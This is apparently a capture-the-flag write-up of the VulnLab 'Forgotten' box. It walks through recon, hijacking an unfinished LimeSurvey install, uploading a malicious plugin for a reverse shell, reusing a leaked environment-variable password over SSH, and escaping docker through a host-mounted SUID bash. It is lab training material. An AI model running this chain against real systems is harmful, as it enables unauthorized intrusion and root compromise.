---
title: VulnLab Forgotten
description: VulnLab Forgotten
image:
  path: forgotten.png
categories:
- VulnLab Boxes
layout: post
media_subpath: /assets/posts/labs/vulnlab/boxes/forgotten
tags:
- vulnlab-boxes
---
# Forgotten
## Recon
```
└─$ rustscan -a 10.10.93.59 -r 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports: The virtual equivalent of knocking on doors.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 65435'.
Open 10.10.93.59:22
Open 10.10.93.59:80
[~] Starting Script(s)
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 20:37 +05
Initiating Ping Scan at 20:37
Scanning 10.10.93.59 [4 ports]
Completed Ping Scan at 20:37, 0.13s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:37
Completed Parallel DNS resolution of 1 host. at 20:37, 0.10s elapsed
DNS resolution of 1 IPs took 0.10s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 20:37
Scanning 10.10.93.59 [2 ports]
Discovered open port 80/tcp on 10.10.93.59
Discovered open port 22/tcp on 10.10.93.59
Completed SYN Stealth Scan at 20:37, 1.70s elapsed (2 total ports)
Nmap scan report for 10.10.93.59
Host is up, received echo-reply ttl 63 (0.21s latency).
Scanned at 2024-12-08 20:37:13 +05 for 2s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.05 seconds
           Raw packets sent: 7 (284B) | Rcvd: 3 (116B)

```
```
└─$ nmap -sC -sV -p22,80 10.10.93.59   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 20:37 +05
Nmap scan report for 10.10.93.59
Host is up (0.100s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3d:21:10:98:e7:f4:8d:e7:be:c7:d1:8b:ca:d8:5d:10 (ECDSA)
|_  256 c9:b1:81:cf:be:6d:2f:c5:ea:72:8d:fb:e1:93:60:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.56
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.06 seconds

```

Visiting web server return `403`

![](1.png)

Let's fuzz it
```
└─$ gobuster dir -u http://10.10.93.59 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt   
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.93.59
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/survey               (Status: 301) [Size: 311] [--> http://10.10.93.59/survey/]

```
```
└─$ ffuf -u http://10.10.93.59/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.93.59/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 110ms]
.htm                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 111ms]
survey                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 100ms]
.                       [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 98ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 97ms]
<SNIP>
```

We find `LimeSurvey` softare running on `/survey` endpoint

![](2.png)

## User
The version of the software is `LimeSurvey 6.3.7`. Googling about vulnerabilities only shows [RCE vulnerability](https://ine.com/blog/cve-2021-44967-limesurvey-rce). But we can't test it since we have to finish the installation. In order to do that seems like we have to deploy mysql database on our attack box. Change `bind-address` in `/etc/mysql/mariadb.conf.d/50-server.cnf` to `0.0.0.0`. Then deploy it
```
└─$ sudo systemctl status mariadb
● mariadb.service - MariaDB 11.4.3 database server
     Loaded: loaded (/usr/lib/systemd/system/mariadb.service; disabled; preset: disabled)
     Active: active (running) since Sun 2024-12-08 21:08:58 +05; 2s ago

```

Login and grant access to `Forgotten` box
```
└─$ sudo mysql -uroot            
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 48
Server version: 11.4.3-MariaDB-1 Debian n/a

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> GRANT ALL PRIVILEGES ON *.* TO 'root'@'10.10.93.59' IDENTIFIED BY 'root' WITH GRANT OPTION;
Query OK, 0 rows affected (0.001 sec)

MariaDB [(none)]> 
```

Now, continue installation. It will create a database for us

![](3.png)

![](4.png)

Populate the database and finish the installation

![](5.png)

![](6.png)

Now we login to admin panel and follow the instructions from this [blog](https://ine.com/blog/cve-2021-44967-limesurvey-rce). We need to download this [PoC](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE). Modify `php-rev.php` and `config.xml` files. Set `version` to `6.3.7` in `config.xml`
```
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>Y1LD1R1M</name>
        <type>plugin</type>
        <creationDate>2020-03-20</creationDate>
        <lastUpdate>2020-03-31</lastUpdate>
        <author>Y1LD1R1M</author>
        <authorUrl>https://github.com/Y1LD1R1M-1337</authorUrl>
        <supportUrl>https://github.com/Y1LD1R1M-1337</supportUrl>
        <version>5.0</version>
        <license>GNU General Public License version 2 or later</license>
        <description>
                <![CDATA[Author : Y1LD1R1M]]></description>
    </metadata>

    <compatibility>
        <version>6.3.7</version>
    </compatibility>
    <updaters disabled="disabled"></updaters>
</config>

```

Zip the files
```
└─$ zip rce-plugin.zip ./php-rev.php ./config.xml
  adding: php-rev.php (deflated 61%)
  adding: config.xml (deflated 53%)
```

Go `Configuration -> Plugins -> Upload & Install`. Upload zip archive, install it and then activate the plugin.

![](7.png)

![](8.png)

We have to visit `http://10.10.93.59/survey/upload/plugins/Y1LD1R1M/php-rev.php` and then should receive receive our shell

![](9.png)

There is no user flag. We see that it's a docker container. We can check environmental variables 
```
$ env
APACHE_CONFDIR=/etc/apache2
HOSTNAME=efaa6f5097ed
PHP_INI_DIR=/usr/local/etc/php
LIMESURVEY_ADMIN=limesvc
SHLVL=0
PHP_LDFLAGS=-Wl,-O1 -pie
APACHE_RUN_DIR=/var/run/apache2
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_VERSION=8.0.30
APACHE_PID_FILE=/var/run/apache2/apache2.pid
GPG_KEYS=1729F83938DA44E27BA0F4D3DBDB397470D12172 BFDDD28642824F8118EF77909B67A5C12229118F 2C16C765DBE54A088130F1BC4B9B5F600B55F3B4 39B641343D8C104B2B146DC3F9C39DC0B9698544
PHP_ASC_URL=https://www.php.net/distributions/php-8.0.30.tar.xz.asc
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_URL=https://www.php.net/distributions/php-8.0.30.tar.xz
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_GROUP=limesvc
APACHE_RUN_USER=limesvc
APACHE_LOG_DIR=/var/log/apache2
LIMESURVEY_PASS=<REDACTED>
PWD=/
PHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc             libc-dev                make            pkg-config              re2c
PHP_SHA256=216ab305737a5d392107112d618a755dc5df42058226f1670e9db90e77d777d9
APACHE_ENVVARS=/etc/apache2/envvars

```

Nothing interesting except for `LIMESURVEY_PASS`. Upgrade shell with `script /dev/null -c bash` to be able to run `sudo -l`. 
```
limesvc@efaa6f5097ed:/$ sudo -l
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for limesvc: <REDACTED>

Matching Defaults entries for limesvc on efaa6f5097ed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User limesvc may run the following commands on efaa6f5097ed:
    (ALL : ALL) ALL
```

Nothing useful, but trying to login as `limesvc` via `ssh` works
```
└─$ ssh limesvc@10.10.93.59  
The authenticity of host '10.10.93.59 (10.10.93.59)' can't be established.
ED25519 key fingerprint is SHA256:w4tkIX1hTe4ALi8CJCkIgOtasP2UzGJl1KT8+iXvogY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.93.59' (ED25519) to the list of known hosts.
(limesvc@10.10.93.59) Password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-1012-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Dec  8 16:35:23 UTC 2024

  System load:  0.0               Processes:                119
  Usage of /:   39.1% of 7.57GB   Users logged in:          0
  Memory usage: 20%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for ens5:    10.10.93.59


Expanded Security Maintenance for Applications is not enabled.

76 updates can be applied immediately.
48 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Dec  2 15:32:15 2023 from 10.10.1.254
limesvc@ip-10-10-200-233:~$ 

```

## Root
Let's enumerate as `limesvc`. We find `/opt/limesurvey`, which might be mounted to container
```
limesvc@ip-10-10-200-233:/opt/limesurvey$ ls -lha
total 168K
drwxr-xr-x  15 limesvc limesvc 4.0K Nov 27  2023 .
drwxr-xr-x   4 root    root    4.0K Dec  2  2023 ..
-rw-rw-r--   1 limesvc limesvc 1.1K Nov 27  2023 .htaccess
-rw-rw-r--   1 limesvc limesvc  49K Nov 27  2023 LICENSE
-rw-rw-r--   1 limesvc limesvc 2.5K Nov 27  2023 README.md
-rw-rw-r--   1 limesvc limesvc  536 Nov 27  2023 SECURITY.md
drwxr-xr-x   2 limesvc limesvc 4.0K Nov 27  2023 admin
drwxr-xr-x  15 limesvc limesvc 4.0K Nov 27  2023 application
drwxr-xr-x  10 limesvc limesvc 4.0K Nov 27  2023 assets
drwxr-xr-x   7 limesvc limesvc 4.0K Nov 27  2023 docs
-rw-rw-r--   1 limesvc limesvc 8.0K Nov 27  2023 gulpfile.js
-rw-rw-r--   1 limesvc limesvc 5.5K Nov 27  2023 index.php
drwxr-xr-x   4 limesvc limesvc 4.0K Nov 27  2023 installer
drwxr-xr-x 120 limesvc limesvc 4.0K Nov 27  2023 locale
drwxr-xr-x   4 limesvc limesvc 4.0K Nov 27  2023 modules
drwxr-xr-x  23 limesvc limesvc 4.0K Nov 27  2023 node_modules
-rwxrwxr-x   1 limesvc limesvc 9.5K Nov 27  2023 open-api-gen.php
drwxr-xr-x   3 limesvc limesvc 4.0K Nov 27  2023 plugins
-rw-rw-r--   1 limesvc limesvc 2.2K Nov 27  2023 psalm-all.xml
-rw-rw-r--   1 limesvc limesvc 1.1K Nov 27  2023 psalm-strict.xml
-rw-rw-r--   1 limesvc limesvc 1.1K Nov 27  2023 psalm.xml
-rw-rw-r--   1 limesvc limesvc 1.7K Nov 27  2023 setdebug.php
drwxr-xr-x   5 limesvc limesvc 4.0K Nov 27  2023 themes
drwxr-xr-x   6 limesvc limesvc 4.0K Dec  8 16:27 tmp
drwxr-xr-x   9 limesvc limesvc 4.0K Nov 27  2023 upload
drwxr-xr-x  36 limesvc limesvc 4.0K Nov 27  2023 vendor
```
We can confirm it by running `findmnt` from container
```
limesvc@efaa6f5097ed:/$ findmnt
<SNIP>
|-/etc/resolv.conf      /dev/root[/var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/resolv.conf]
|                                                  ext4    rw,relatime,discard,e
|-/etc/hostname         /dev/root[/var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/hostname]
|                                                  ext4    rw,relatime,discard,e
|-/etc/hosts            /dev/root[/var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/hosts]
|                                                  ext4    rw,relatime,discard,e
`-/var/www/html/survey  /dev/root[/opt/limesurvey] ext4    rw,relatime,discard,e

```
We can see that docker process is running as `root`
```
limesvc@ip-10-10-200-233:/opt/limesurvey$ ps -aef
UID          PID    PPID  C STIME TTY          TIME CMD
<SNIP>
root         677       1  0 15:35 ?        00:00:02 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root         951     677  0 15:35 ?        00:00:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 80 -container-ip 172.17.0.2 -container-port 80
root         957     677  0 15:35 ?        00:00:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 80 -container-ip 172.17.0.2 -container-port 80
root         980       1  0 15:35 ?        00:00:01 /usr/bin/containerd-shim-runc-v2 -namespace moby -id efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d -address /run/containerd/containerd.sock
<SNIP>
```

We can try [to create a bash suid file in the mounted folder inside the container and execute it from the host to privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells-and-host-mount). Now we run the following commands inside the container as `root` in mounted directory
```
root@efaa6f5097ed:/var/www/html/survey# cp /bin/bash ./privesc
cp /bin/bash ./privesc
root@efaa6f5097ed:/var/www/html/survey# chown root:root ./privesc
chown root:root ./privesc
root@efaa6f5097ed:/var/www/html/survey# chmod 4777 ./privesc
chmod 4777 ./privesc
```

Then invoke binary from the host
```
limesvc@ip-10-10-200-233:/opt/limesurvey$ ./privesc -p
privesc-5.1# whoami
root
privesc-5.1# 
```

[https://api.vulnlab.com/api/v1/share?id=ef9f5fc4-cc12-4c09-9dae-35c9e7c819ef](https://api.vulnlab.com/api/v1/share?id=ef9f5fc4-cc12-4c09-9dae-35c9e7c819ef)